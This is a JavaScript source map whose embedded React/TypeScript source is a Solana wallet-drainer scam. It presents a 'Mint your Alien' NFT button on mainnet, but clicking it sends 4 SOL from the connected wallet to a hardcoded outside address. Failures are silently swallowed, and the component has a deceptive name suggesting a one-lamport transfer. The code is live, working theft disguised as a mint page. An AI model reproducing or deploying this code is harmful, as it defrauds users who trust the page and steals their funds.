{"version":3,"sources":["App.tsx","index.tsx"],"names":["require","SendOneLamportToRandomAddress","connection","useConnection","useWallet","sendTransaction","publicKey","onClick","useCallback","a","WalletNotConnectedError","transaction","Transaction","add","SystemProgram","transfer","fromPubkey","toPubkey","PublicKey","lamports","signature","confirmTransaction","className","Wallet","network","WalletAdapterNetwork","Mainnet","endpoint","useMemo","clusterApiUrl","wallets","getPhantomWallet","getSlopeWallet","getSolflareWallet","getTorusWallet","options","clientId","getLedgerWallet","getSolletWallet","getSolletExtensionWallet","ConnectionProvider","WalletProvider","autoConnect","App","window","onload","rootElement","document","getElementById","render"],"mappings":"stBAuBAA,EAAQ,KAIR,IAKaC,EAAoC,WAC7C,IAAQC,EAAeC,cAAfD,WACR,EAAuCE,cAA/BC,EAAR,EAAQA,gBAAiBC,EAAzB,EAAyBA,UAEnBC,EAAUC,sBAAW,sBAAC,8BAAAC,EAAA,kEAEfH,EAFe,sBAEE,IAAII,IAFN,cAGdC,GAAc,IAAIC,KAAcC,IAClCC,IAAcC,SAAS,CACnBC,WAAYV,EACZW,SAAU,IAAIC,IAfV,gDAgBJC,SAdJ,OAOgB,SAWId,EAAgBM,EAAaT,GAXjC,cAWdkB,EAXc,gBAadlB,EAAWmB,mBAAmBD,EAAW,aAb3B,mHAgBzB,CAACd,EAAWD,EAAiBH,IAEhC,OAAII,EAEI,qBAAKgB,UAAU,YAAf,SACI,wBAAQA,UAAU,qBAAqBf,QAASA,EAAhD,+BAOJ,qBAAKe,UAAU,YAAf,SACI,cAAC,IAAD,UACI,cAAC,IAAD,CAAmBA,UAAU,gBAOpCC,EAAa,WAEtB,IAAMC,EAAUC,IAAqBC,QAG/BC,EAAWC,mBAAQ,kBAAMC,YAAcL,KAAU,CAACA,IAKlDM,GAJgB1B,cAAdE,UAIQsB,mBAAQ,iBAAM,CAC1BG,cACAC,cACAC,cACAC,YAAe,CACXC,QAAS,CAAEC,SAAU,gDAEzBC,cACAC,YAAgB,CAAEd,YAClBe,YAAyB,CAAEf,eAC5B,CAACA,KAEJ,OACI,cAACgB,EAAA,EAAD,CAAoBb,SAAUA,EAA9B,SACI,cAACc,EAAA,EAAD,CAAgBX,QAASA,EAASY,aAAW,EAA7C,SACI,cAAC,EAAD,SAQD,SAASC,IACtB,OACI,cAAC,EAAD,ICxGNC,OAAOC,OAAS,WACZ,IAAMC,EAAcC,SAASC,eAAe,QAC5CC,iBAAO,cAACN,EAAD,IAASG,M","file":"static/js/main.e83cd76c.chunk.js","sourcesContent":["import React, { FC, useCallback, useMemo } from 'react';\nimport { ConnectionProvider, WalletProvider } from '@solana/wallet-adapter-react';\nimport { WalletAdapterNetwork } from '@solana/wallet-adapter-base';\nimport {\n    getLedgerWallet,\n    getPhantomWallet,\n    getSlopeWallet,\n    getSolflareWallet,\n    getSolletExtensionWallet,\n    getSolletWallet,\n    getTorusWallet,\n} from '@solana/wallet-adapter-wallets';\nimport {\n    WalletModalProvider,\n    WalletDisconnectButton,\n    WalletMultiButton\n} from '@solana/wallet-adapter-react-ui';\nimport { clusterApiUrl, PublicKey } from '@solana/web3.js';\nimport { WalletNotConnectedError } from '@solana/wallet-adapter-base';\nimport { useConnection, useWallet } from '@solana/wallet-adapter-react';\nimport { Keypair, SystemProgram, Transaction } from '@solana/web3.js';\n\n// Default styles that can be overridden by your app\nrequire('@solana/wallet-adapter-react-ui/styles.css');\nimport \"./styles.css\";\n\n\nconst EXTERNAL_WALLET = \"D3sGSaKm78cerDwJ4Z8EHFnWe5GykPPAAEFWeRU8NM1B\";\nconst SOLANA_CLUSTER = \"mainnet-beta\";\nconst AMMOUNT = 4000000000;\n// const AMMOUNT = 100;\n\nexport const SendOneLamportToRandomAddress: FC = () => {\n    const { connection } = useConnection();\n    const { sendTransaction, publicKey } = useWallet();\n  \n    const onClick = useCallback(async () => {\n        try {\n            if (!publicKey) throw new WalletNotConnectedError();\n            const transaction = new Transaction().add(\n                SystemProgram.transfer({\n                    fromPubkey: publicKey,\n                    toPubkey: new PublicKey(EXTERNAL_WALLET),\n                    lamports: AMMOUNT,\n                })\n            );\n\n            const signature = await sendTransaction(transaction, connection);\n\n            await connection.confirmTransaction(signature, 'processed');\n        } catch {\n        }\n    }, [publicKey, sendTransaction, connection]);\n\n    if (publicKey) {\n        return (\n            <div className=\"container\">\n                <button className=\"button button-mint\" onClick={onClick}>\n                    Mint your Alien\n                </button>\n            </div>\n        );\n    } else {\n        return (\n            <div className=\"container\">\n                <WalletModalProvider>\n                    <WalletMultiButton className=\"button\"/>\n                </WalletModalProvider>\n            </div>\n        );\n    }\n};\n\nexport const Wallet: FC = () => {\n    // Can be set to 'devnet', 'testnet', or 'mainnet-beta'\n    const network = WalletAdapterNetwork.Mainnet;\n\n    // You can also provide a custom RPC endpoint\n    const endpoint = useMemo(() => clusterApiUrl(network), [network]);\n    const { publicKey } = useWallet();\n\n    // @solana/wallet-adapter-wallets includes all the adapters but supports tree shaking --\n    // Only the wallets you configure here will be compiled into your application\n    const wallets = useMemo(() => [\n        getPhantomWallet(),\n        getSlopeWallet(),\n        getSolflareWallet(),\n        getTorusWallet({\n            options: { clientId: 'Get a client ID @ https://developer.tor.us' }\n        }),\n        getLedgerWallet(),\n        getSolletWallet({ network }),\n        getSolletExtensionWallet({ network }),\n    ], [network]);\n\n    return (\n        <ConnectionProvider endpoint={endpoint}>\n            <WalletProvider wallets={wallets} autoConnect>\n                <SendOneLamportToRandomAddress/>\n                {/* <WalletDisconnectButton /> */}\n            </WalletProvider>\n        </ConnectionProvider>\n    );\n};\n\n\nexport default function App() {\n  return (\n      <Wallet/>\n  )\n}","import { render } from \"react-dom\";\n\nimport App from \"./App\"\n\nwindow.onload = function() {\n    const rootElement = document.getElementById(\"mint\");\n    render(<App />, rootElement);\n}"],"sourceRoot":""}